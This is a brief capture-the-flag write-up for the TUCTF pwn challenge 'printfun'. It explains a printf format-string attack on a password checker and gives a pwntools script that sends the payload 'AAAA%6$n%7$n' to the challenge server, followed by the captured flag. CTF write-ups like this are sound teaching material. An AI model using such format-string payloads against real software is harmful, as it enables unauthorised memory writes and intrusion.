# printfun

## PWN - Points: 500

> I have made an impenetrable password checker. Just try your luck!
>
> 
>
> nc chal.tuctf.com 30501
>
> [printfun](printfun)
>

Exploit `printf` with a format string and write identical content into the two buffers that are compared.

Exploit script:

```python
from pwn import *

# context.terminal = ['termite', '-e']
# p = gdb.debug('./printfun')
# p = process('printfun')
p = remote('chal.tuctf.com', 30501)

p.sendlineafter('? ', 'AAAA%6$n%7$n')
p.interactive()
```

flag: `TUCTF{wh47'5_4_pr1n7f_l1k3_y0u_d01n6_4_b1n4ry_l1k3_7h15?}`